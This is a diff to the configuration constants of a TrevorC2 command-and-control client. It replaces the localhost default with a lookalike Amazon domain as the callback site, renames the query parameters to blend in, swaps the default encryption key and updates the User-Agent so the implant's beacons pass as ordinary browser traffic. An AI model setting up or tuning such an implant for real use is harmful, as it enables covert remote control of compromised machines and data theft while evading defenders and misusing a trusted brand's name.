@@ -11,19 +11,19 @@
 # CONFIG CONSTANTS:
 
 # site used to communicate with (remote TrevorC2 site)
-SITE_URL = ("http://127.0.0.1")
+SITE_URL = "https://tls-images-amazon.com"
 
 # THIS IS WHAT PATH WE WANT TO HIT FOR CODE - YOU CAN MAKE THIS ANYTHING EXAMPLE: /index.aspx (note you need to change this as well on trevorc2_server)
-ROOT_PATH_QUERY = ("/")
+ROOT_PATH_QUERY = "/"
 
 # THIS FLAG IS WHERE THE CLIENT WILL SUBMIT VIA URL AND QUERY STRING GET PARAMETER
-SITE_PATH_QUERY = ("/images")
+SITE_PATH_QUERY = "/images"
 
 # THIS IS THE QUERY STRING PARAMETER USED
-QUERY_STRING = ("guid=")
+QUERY_STRING = "rid="
 
 # STUB FOR DATA - THIS IS USED TO SLIP DATA INTO THE SITE, WANT TO CHANGE THIS SO ITS NOT STATIC
-STUB = ("oldcss=")
+STUB = "telem="
 
 # install_beacon_delay specifies the seconds to wait before connecting home for the first time after script start
 install_beacon_delay = 0
@@ -33,9 +33,9 @@ min_beacon_interval = 2
 max_beacon_interval = 8
 
 # THIS IS OUR ENCRYPTION KEY - THIS NEEDS TO BE THE SAME ON BOTH SERVER AND CLIENT FOR APPROPRIATE DECRYPTION. RECOMMEND CHANGING THIS FROM THE DEFAULT KEY
-CIPHER = ("Tr3v0rC2R0x@nd1s@w350m3#TrevorForget")
+CIPHER = "DYZAWXPCghaFGmzVT3wQKUZbkrDZurdZHfHy"
 
-HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'}
+HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0'}
 
 # DO NOT CHANGE BELOW THIS LINE
 
